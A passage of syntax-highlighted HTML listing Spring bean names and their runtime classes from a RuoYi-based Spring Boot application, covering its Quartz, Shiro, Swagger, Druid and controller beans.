class="hljs-string">&quot;spring.quartz-org.springframework.boot.autoconfigure.quartz.QuartzProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.quartz.QuartzProperties&quot;</span><br> <span class="hljs-string">&quot;restartingClassPathChangedEventListener&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$RestartConfiguration$$Lambda$803/782560197&quot;</span><br> <span class="hljs-string">&quot;conventionErrorViewResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.DefaultErrorViewResolver&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$EnableWebMvcConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$EnableWebMvcConfiguration&quot;</span><br> <span class="hljs-string">&quot;xmlModelPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.plugins.XmlModelPlugin&quot;</span><br> <span class="hljs-string">&quot;org.springframework.context.event.internalEventListenerProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.event.EventListenerMethodProcessor&quot;</span><br> <span class="hljs-string">&quot;h2Console&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.ServletRegistrationBean&quot;</span><br> <span class="hljs-string">&quot;localeCharsetMappingsCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration$LocaleCharsetMappingsCustomizer&quot;</span><br> <span class="hljs-string">&quot;methodResolver&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.HandlerMethodResolver&quot;</span><br> <span class="hljs-string">&quot;webMvcOpenApiTransformationFilterRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;parameterRequiredReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ParameterRequiredReader&quot;</span><br> <span class="hljs-string">&quot;sysUserOnlineMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy295&quot;</span><br> <span class="hljs-string">&quot;propertyMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.PropertyMapperImpl&quot;</span><br> <span class="hljs-string">&quot;formContentFilter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.filter.OrderedFormContentFilter&quot;</span><br> <span class="hljs-string">&quot;defaultViewResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span><br> <span class="hljs-string">&quot;serviceModelToOpenApiMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.ServiceModelToOpenApiMapperImpl&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$EnableTransactionManagementConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$EnableTransactionManagementConfiguration&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiWebMvcConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiWebMvcConfiguration$$EnhancerBySpringCGLIB$$6375259&quot;</span><br> <span class="hljs-string">&quot;routerFunctionMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.function.support.RouterFunctionMapping&quot;</span><br> <span class="hljs-string">&quot;operationPathDecorator&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.paths.OperationPathDecorator&quot;</span><br> <span class="hljs-string">&quot;jacksonObjectMapperBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.http.converter.json.Jackson2ObjectMapperBuilder&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;notNullPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.NotNullAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;liveReloadServer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.livereload.LiveReloadServer&quot;</span><br> <span class="hljs-string">&quot;spring.task.scheduling-org.springframework.boot.autoconfigure.task.TaskSchedulingProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.TaskSchedulingProperties&quot;</span><br> <span class="hljs-string">&quot;multipartResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.multipart.support.StandardServletMultipartResolver&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiMappingConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiMappingConfiguration$$EnhancerBySpringCGLIB$$afba55e7&quot;</span><br> <span class="hljs-string">&quot;expanderSize&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.ExpandedParameterSizeAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span><br> <span class="hljs-string">&quot;lifecycleProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.support.DefaultLifecycleProcessor&quot;</span><br> <span class="hljs-string">&quot;org.springframework.aop.config.internalAutoProxyCreator&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.aop.aspectj.annotation.AnnotationAwareAspectJAutoProxyCreator&quot;</span><br> <span class="hljs-string">&quot;requestMappingHandlerAdapter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.TemplateEngineConfigurations$DefaultTemplateEngineConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.TemplateEngineConfigurations$DefaultTemplateEngineConfiguration&quot;</span><br> <span class="hljs-string">&quot;optimized&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.OptimizedModelPropertiesProvider&quot;</span><br> <span class="hljs-string">&quot;mvcHandlerMappingIntrospector&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.handler.HandlerMappingIntrospector&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysPostServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysPostServiceImpl&quot;</span><br> <span class="hljs-string">&quot;operationHiddenReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationHiddenReader&quot;</span><br> <span class="hljs-string">&quot;spring.info-org.springframework.boot.autoconfigure.info.ProjectInfoProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.info.ProjectInfoProperties&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.context.annotation.internalAutowiredAnnotationProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration$JdbcTransactionManagerConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration$JdbcTransactionManagerConfiguration&quot;</span><br> <span class="hljs-string">&quot;xssFilterRegistration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.FilterRegistrationBean&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiDocumentationConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.configuration.OpenApiDocumentationConfiguration$$EnhancerBySpringCGLIB$$d364e5bb&quot;</span><br> <span class="hljs-string">&quot;springSessionValidationScheduler&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.web.session.SpringSessionValidationScheduler&quot;</span><br> <span class="hljs-string">&quot;responseBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.type.classreading.ConcurrentReferenceCachingMetadataReaderFactory&quot;</span><br> <span class="hljs-string">&quot;genTableServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.generator.service.impl.GenTableServiceImpl$$EnhancerBySpringCGLIB$$cac2a213&quot;</span><br> <span class="hljs-string">&quot;modelBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;securitySchemeMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.SecuritySchemeMapperImpl&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$ParameterNamesModuleConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$ParameterNamesModuleConfiguration&quot;</span><br> <span class="hljs-string">&quot;permission&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.web.service.PermissionService&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.sql.init.DataSourceInitializationConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.sql.init.DataSourceInitializationConfiguration&quot;</span><br> <span class="hljs-string">&quot;thymeleafViewResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.thymeleaf.spring5.view.ThymeleafViewResolver&quot;</span><br> <span class="hljs-string">&quot;errorAttributes&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.error.DefaultErrorAttributes&quot;</span><br> <span class="hljs-string">&quot;beanNameHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;</span><br> <span class="hljs-string">&quot;objectMapperBeanPropertyNamingStrategy&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.ObjectMapperBeanPropertyNamingStrategy&quot;</span><br> <span class="hljs-string">&quot;minMaxPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.MinMaxAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;sysIndexController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysIndexController&quot;</span><br> <span class="hljs-string">&quot;statFilter&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.filter.stat.StatFilter&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryConfiguration$EmbeddedTomcat&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryConfiguration$EmbeddedTomcat&quot;</span><br> <span class="hljs-string">&quot;operationNicknameIntoUniqueIdReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationNicknameIntoUniqueIdReader&quot;</span><br> <span class="hljs-string">&quot;sysLoginController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysLoginController&quot;</span><br> <span class="hljs-string">&quot;sysRoleDeptMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy288&quot;</span><br> <span class="hljs-string">&quot;sysUserServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysUserServiceImpl$$EnhancerBySpringCGLIB$$dcdd2a4e&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.context.properties.EnableConfigurationPropertiesRegistrar.methodValidationExcludeFilter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.validation.beanvalidation.MethodValidationExcludeFilter$$Lambda$374/579415823&quot;</span><br> <span class="hljs-string">&quot;expanderMinMax&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.ExpandedParameterMinMaxAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;operationTagsReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationTagsReader&quot;</span><br> <span class="hljs-string">&quot;sysDictTypeController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysDictTypeController$$EnhancerBySpringCGLIB$$781136f7&quot;</span><br> <span class="hljs-string">&quot;licenseMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.LicenseMapperImpl&quot;</span><br> <span class="hljs-string">&quot;parameterNameReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ParameterNameReader&quot;</span><br> <span class="hljs-string">&quot;quartzScheduler&quot;</span> -&gt; <span class="hljs-string">&quot;org.quartz.impl.StdScheduler&quot;</span><br> <span class="hljs-string">&quot;sessionFactory&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.session.OnlineSessionFactory&quot;</span><br> <span class="hljs-string">&quot;org.mybatis.spring.boot.autoconfigure.MybatisLanguageDriverAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.mybatis.spring.boot.autoconfigure.MybatisLanguageDriverAutoConfiguration$$EnhancerBySpringCGLIB$$374eff9f&quot;</span><br> <span class="hljs-string">&quot;flashMapManager&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.support.SessionFlashMapManager&quot;</span><br> <span class="hljs-string">&quot;expandedParameterBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;swagger2Module&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.configuration.Swagger2JacksonModule&quot;</span><br> <span class="hljs-string">&quot;threadPoolTaskExecutor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor&quot;</span><br> <span class="hljs-string">&quot;logAspect&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.aspectj.LogAspect&quot;</span><br> <span class="hljs-string">&quot;fileSystemWatcherFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$RestartConfiguration$$Lambda$802/1367205483&quot;</span><br> <span class="hljs-string">&quot;cacheService&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.web.service.CacheService&quot;</span><br> <span class="hljs-string">&quot;ryTask&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.quartz.task.RyTask&quot;</span><br> <span class="hljs-string">&quot;swaggerController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.tool.SwaggerController$$EnhancerBySpringCGLIB$$af7e3416&quot;</span><br> <span class="hljs-string">&quot;sysConfigMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy292&quot;</span><br> <span class="hljs-string">&quot;defaultModelProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.DefaultModelProvider&quot;</span><br> <span class="hljs-string">&quot;cachingModelProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.CachingModelProvider&quot;</span><br> <span class="hljs-string">&quot;swaggerApiListingReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.web.SwaggerApiListingReader&quot;</span><br> <span class="hljs-string">&quot;expanderNotBlank&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.ExpandedParameterNotBlankAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;sysJobController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.quartz.controller.SysJobController$$EnhancerBySpringCGLIB$$f85db5c&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$AspectJAutoProxyingConfiguration$CglibAutoProxyConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$AspectJAutoProxyingConfiguration$CglibAutoProxyConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.transaction.config.internalTransactionalEventListenerFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.transaction.event.TransactionalEventListenerFactory&quot;</span><br> <span class="hljs-string">&quot;expanderNotNull&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.ExpandedParameterNotNullAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;sysOperLogMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy298&quot;</span><br> <span class="hljs-string">&quot;mvcValidator&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.validation.ValidatorAdapter&quot;</span><br> <span class="hljs-string">&quot;viewProviderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;applicationAvailability&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.availability.ApplicationAvailabilityBean&quot;</span><br> <span class="hljs-string">&quot;defaultTemplateResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver&quot;</span><br> <span class="hljs-string">&quot;mvcResourceUrlProvider&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.resource.ResourceUrlProvider&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.context.internalConfigurationPropertiesBinderFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.context.properties.ConfigurationPropertiesBinder$Factory&quot;</span><br> <span class="hljs-string">&quot;spring.thymeleaf-org.springframework.boot.autoconfigure.thymeleaf.ThymeleafProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafProperties&quot;</span><br> <span class="hljs-string">&quot;swaggerUiConfigurer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.boot.starter.autoconfigure.SwaggerUiWebMvcConfigurer&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.AutoConfigurationPackages&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.AutoConfigurationPackages$BasePackages&quot;</span><br> <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.stat.DruidWebStatFilterConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.stat.DruidWebStatFilterConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysNoticeServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysNoticeServiceImpl&quot;</span><br> <span class="hljs-string">&quot;sysJobMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy302&quot;</span><br> <span class="hljs-string">&quot;openApiParameterBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.parameter.OpenApiParameterBuilder&quot;</span><br> <span class="hljs-string">&quot;sizePlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.SizeAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;compatibilityModelMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.CompatibilityModelMapperImpl&quot;</span><br> <span class="hljs-string">&quot;sysRoleController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysRoleController$$EnhancerBySpringCGLIB$$b87157e9&quot;</span><br> <span class="hljs-string">&quot;sysDeptController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysDeptController$$EnhancerBySpringCGLIB$$48ac0e76&quot;</span><br> <span class="hljs-string">&quot;operationDeprecatedReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationDeprecatedReader&quot;</span><br> <span class="hljs-string">&quot;sysLogininforController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.monitor.SysLogininforController$$EnhancerBySpringCGLIB$$46005583&quot;</span><br> <span class="hljs-string">&quot;swaggerOperationTagsReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.SwaggerOperationTagsReader&quot;</span><br> <span class="hljs-string">&quot;propertyDiscriminatorBasedInheritancePlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.plugins.PropertyDiscriminatorBasedInheritancePlugin&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;patternPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.PatternAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;vendorExtensionsMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.VendorExtensionsMapperImpl&quot;</span><br> <span class="hljs-string">&quot;com.github.pagehelper.autoconfigure.PageHelperAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;com.github.pagehelper.autoconfigure.PageHelperAutoConfiguration$$EnhancerBySpringCGLIB$$6c913d94&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysLogininforMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy297&quot;</span><br> <span class="hljs-string">&quot;sysUserOnlineServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysUserOnlineServiceImpl&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$ThymeleafJava8TimeDialect&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$ThymeleafJava8TimeDialect&quot;</span><br> <span class="hljs-string">&quot;messageSourceProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.context.MessageSourceProperties&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$WebMvcAutoConfigurationAdapter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$WebMvcAutoConfigurationAdapter&quot;</span><br> <span class="hljs-string">&quot;sysJobServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.quartz.service.impl.SysJobServiceImpl$$EnhancerBySpringCGLIB$$2a2c6f2b&quot;</span><br> <span class="hljs-string">&quot;buildController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.tool.BuildController$$EnhancerBySpringCGLIB$$77185882&quot;</span><br> <span class="hljs-string">&quot;sysDictTypeServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysDictTypeServiceImpl$$EnhancerBySpringCGLIB$$b691e526&quot;</span><br> <span class="hljs-string">&quot;errorPageRegistrarBeanPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.server.ErrorPageRegistrarBeanPostProcessor&quot;</span><br> <span class="hljs-string">&quot;mvcConversionService&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.format.WebConversionService&quot;</span><br> <span class="hljs-string">&quot;sysPostController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysPostController$$EnhancerBySpringCGLIB$$a6283527&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.context.properties.BoundConfigurationProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.context.properties.BoundConfigurationProperties&quot;</span><br> <span class="hljs-string">&quot;mvcPathMatcher&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.util.AntPathMatcher&quot;</span><br> <span class="hljs-string">&quot;handlerExceptionResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.handler.HandlerExceptionResolverComposite&quot;</span><br> <span class="hljs-string">&quot;basicErrorController&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController&quot;</span><br> <span class="hljs-string">&quot;webMvcSwaggerTransformer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.web.WebMvcBasePathAndHostnameTransformationFilter&quot;</span><br> <span class="hljs-string">&quot;parameterDataTypeReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ParameterDataTypeReader&quot;</span><br> <span class="hljs-string">&quot;operationSummaryReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationSummaryReader&quot;</span><br> <span class="hljs-string">&quot;webMvcRequestHandlerProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.plugins.WebMvcRequestHandlerProvider&quot;</span><br> <span class="hljs-string">&quot;documentationPluginsManager&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.plugins.DocumentationPluginsManager&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.swagger2.configuration.Swagger2DocumentationConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.configuration.Swagger2DocumentationConfiguration$$EnhancerBySpringCGLIB$$57862016&quot;</span><br> <span class="hljs-string">&quot;spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.DataSourceProperties&quot;</span><br> <span class="hljs-string">&quot;namedParameterJdbcTemplate&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate&quot;</span><br> <span class="hljs-string">&quot;sysJobLogServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.quartz.service.impl.SysJobLogServiceImpl&quot;</span><br> <span class="hljs-string">&quot;sysProfileController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysProfileController$$EnhancerBySpringCGLIB$$41f1e55f&quot;</span><br> <span class="hljs-string">&quot;applicationConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.ApplicationConfig$$EnhancerBySpringCGLIB$$f00c8169&quot;</span><br> <span class="hljs-string">&quot;spring.web-org.springframework.boot.autoconfigure.web.WebProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.WebProperties&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;openApiSchemaPropertyBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.schema.OpenApiSchemaPropertyBuilder&quot;</span><br> <span class="hljs-string">&quot;druidConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.DruidConfig$$EnhancerBySpringCGLIB$$8d18361b&quot;</span><br> <span class="hljs-string">&quot;mvcViewResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.view.ViewResolverComposite&quot;</span><br> 